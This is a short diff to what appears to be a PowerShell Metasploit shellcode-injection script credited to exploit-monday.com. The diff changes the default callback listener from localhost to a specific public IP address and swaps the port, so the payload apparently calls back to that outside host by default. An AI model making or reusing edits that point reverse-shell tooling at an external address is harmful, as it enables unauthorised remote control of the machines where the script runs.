@@ -168,13 +168,13 @@ http://www.exploit-monday.com
                 ParameterSetName = 'Metasploit' )]
     [ValidateNotNullOrEmpty()]
     [String]
-    $Lhost = '127.0.0.1',
+    $Lhost = '104.7.1.180',
     
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
     [ValidateRange( 1,65535 )]
     [Int]
-    $Lport = 8443,
+    $Lport = 8080,
     
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateNotNull()]
